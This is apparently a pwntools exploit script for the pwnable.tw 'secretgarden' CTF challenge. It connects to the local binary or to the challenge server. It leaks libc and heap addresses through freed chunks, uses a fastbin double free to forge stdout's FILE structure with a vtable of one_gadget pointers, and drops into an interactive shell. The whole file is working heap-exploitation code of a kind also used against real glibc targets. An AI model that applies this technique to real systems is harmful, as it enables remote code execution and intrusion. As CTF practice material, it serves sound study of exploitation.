from pwn import *
import sys

context.arch = 'amd64'
elf = ELF('./secretgarden')
status = sys.argv[1]
one = 0x4526a
info("Hijack IO_FILE.vtable in libc-2.23.so")

if status == 'd':
    libc = ELF('./libc_64.so.6')
    io   = process('./secretgarden',env = {"LD_PRELOAD":"./libc_64.so.6"})
    context.log_level = "debug"
elif status == 'l':
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    io   = process('./secretgarden')
elif status == 'r':
    libc = ELF('./libc_64.so.6')
    io   = remote('chall.pwnable.tw',10203)
else:
    info("INVALID STATUS")
    exit()

def Raise(length, name, color):
    io.sendlineafter(" : ", "1")
    io.sendlineafter(" :", str(length))
    io.sendafter(" :", name)
    io.sendlineafter(" :", color)

def Visit():
    io.sendlineafter(" : ", "2")

def Remove(idx):
    io.sendlineafter(" : ", "3")
    io.sendlineafter(":", str(idx))

Raise(0xe0,'aaaa','xxxxxxxx')
Raise(0x40,'aaaa','xxxxxxxx')
Raise(0x40,'aaaa','xxxxxxxx')
Raise(0x20,'stop','xxxxxxxx')
Remove(0)
Remove(1)
Remove(2)
Raise(0x80,'a','yyyyyyyy')
Raise(0x40,'\x60','yyyyyyyy')
Raise(0x40,'a','yyyyyyyy')
Visit()
io.recvuntil('Name of the flower[4] :')
libc_base = u64(io.recv(6).ljust(8,'\x00'))-65-(libc.sym['__malloc_hook']+0x10)
info('LIBC BASE -> %#x'%libc_base)
io.recvuntil('Name of the flower[5] :')
heap_base = u64(io.recv(6).ljust(8,'\x00'))-0x1160
info('HEAP BASE -> %#x'%heap_base)

fake_vt = p64(one+libc_base)*11
Raise(0x60,'fkio','xxxxxxxx')	#7
Raise(0x60,'fkio','xxxxxxxx')	#8
Raise(0x60,fake_vt,'xxxxxxxx')	#9
Remove(7)
Remove(8)
Remove(7)
fake_fd = p64(libc.sym['_IO_2_1_stdout_']+libc_base+0x9d)
Raise(0x60,fake_fd,'yyyyyyyy')
Raise(0x60,'fkio','yyyyyyyy')
Raise(0x60,'fkio','yyyyyyyy')
fake_ff = '\x00'*3
fake_ff += 2*p64(0x0)
fake_ff += p64(0xffffffff)
fake_ff += 2*p64(0x0)
fake_ff += p64(heap_base+0x1440)
io.sendlineafter("choice : ", "1")
io.sendlineafter(" :", str(0x60))
io.sendafter(" :", fake_ff)
io.interactive()
